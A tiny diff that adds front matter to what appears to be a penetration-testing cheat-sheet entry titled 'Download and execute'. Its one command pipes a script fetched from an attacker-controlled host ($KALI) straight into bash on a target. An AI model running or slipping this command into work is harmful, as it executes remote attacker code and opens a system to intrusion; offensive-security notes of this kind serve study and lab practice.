@@ -1,3 +1,7 @@
+---
+category: Uncategorized
+tags: []
+---
 #### Download and execute
 ```bash - target
 curl http://$KALI/shelly.sh | bash
